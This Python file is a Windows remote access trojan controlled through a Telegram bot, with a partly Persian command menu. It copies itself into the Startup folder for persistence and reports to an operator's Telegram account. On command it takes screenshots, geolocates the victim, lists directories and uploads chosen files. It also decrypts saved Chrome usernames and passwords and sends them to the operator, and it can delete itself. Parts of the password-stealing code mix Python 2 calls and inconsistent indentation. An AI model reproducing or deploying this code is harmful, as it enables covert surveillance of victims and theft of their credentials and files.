import os
import autopy
import telebot
from telebot import types
from telebot import util
import requests
import platform
import sqlite3
import win32crypt
import win32ui
import pathlib
import sys
import socks
import socket
from telebot import apihelper
import urllib3





baner = ('''
-------دستورات-------

/self_des==> delete self
/target_info ==> target ip and..
/screen ==>take screen and send
/dis  ==> disconnect to target
/msg ==> show msg box to target
/psw ==>steal chrome users and passwords
/dir ==> list ccontents of directory and files
/dfile ==> download file from target

        ''')
user = os.path.expanduser('~')
start = ('copy 3.py "{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.py"').format(user)
cmd = os.system(start)

TOKEN = 'your token'
bot = telebot.TeleBot(TOKEN)

admin = 'id'
alarm = bot.send_message(admin, 'دستگاه انلاين است')



def comand(m):
     txt = bot.send_message(admin, baner)



@bot.message_handler(commands=['start'])
def start(m):
    msg = bot.reply_to(m, "connected to target")  
    comand(m)
    

@bot.message_handler(commands=['target_info'])
def target_info(m):
    my = requests.get('https://api.ipify.org/')
    end = my.content
    api = requests.get('http://api.hackertarget.com/geoip/?q=' + end)
    api_end = api.content
    uname = platform.platform() + '\n' +  platform.uname()[1]
    bot.send_message(admin, uname)
    bot.send_message(admin, api_end)


@bot.message_handler(commands=['screen'])
def screen(m):
    cd = os.path.expanduser('~')
    image = autopy.bitmap.capture_screen()
    upload = image.save(cd + '\screen.png')
    photo = open(cd + '\screen.png', 'rb')
    bot.send_chat_action(admin, 'upload_photo')
    bot.send_photo(admin, photo)
    bot.send_message(admin, 'اسکرين ارسال شد')


@bot.message_handler(regexp='^/msg ')
def msg(m):
    msg = m.text.replace('/msg ', '')
    win32ui.MessageBox(msg, "Error")
    bot.send_message(admin, "حله")


@bot.message_handler(commands=['psw'])    
def psw(m):
    bot.send_message(admin, 'wait')
    #path to user's login data
    data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
    login_db = os.path.join(data_path, 'Login Data')
    #db connect and query
    c = sqlite3.connect(login_db)
    cursor = c.cursor()
    select_statement = "SELECT origin_url, username_value, password_value FROM logins"
    cursor.execute(select_statement)
    login_data = cursor.fetchall()
    #URL: credentials dictionary
    credential = {}

    #decrytping the password
    for url, user_name, pwd, in login_data:
	pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
	credential[url] = (user_name, pwd[1])
    with open('pwd.txt', 'w') as f:
	for url, credentials in credential.iteritems():
	    if credentials[1]:
                
	         f.write("\n"+url+"\n"+credentials[0].encode('utf-8')+ " | "+credentials[1]+"\n")
	    else:
	         f.write("\n"+url+"\n"+"USERNAME NOT FOUND | PASSWORD NOT FOUND \n")
    psw = open('pwd.txt', 'rb')
    bot.send_document(admin, psw)
    
    
@bot.message_handler(regexp='^/dir ')
def diir(m):
    s = m.text.replace('/dir ', '')
    currentDirectory = pathlib.Path(s)
    for currentFile in currentDirectory.iterdir(): 
        bot.send_message(admin, currentFile)

@bot.message_handler(commands=['self_des'])    
def self_des(m):
    thisfile = os.path.abspath ( __file__ )
    os.remove(thisfile)
    sys.exit()

@bot.message_handler(regexp='^/dfile ')
def dfile(m):
    files = m.text.replace('/dfile ', '')
    fil = open(files, 'rb')
    bot.send_document(admin, fil)

@bot.message_handler(commands=['/show_dir'])
def show(m):
    cwd = os.getcwd()
    bot.send_message(admin, cwd)
    
    
    
    
    
   
    
		
		
	   
        
        
       

bot.polling()
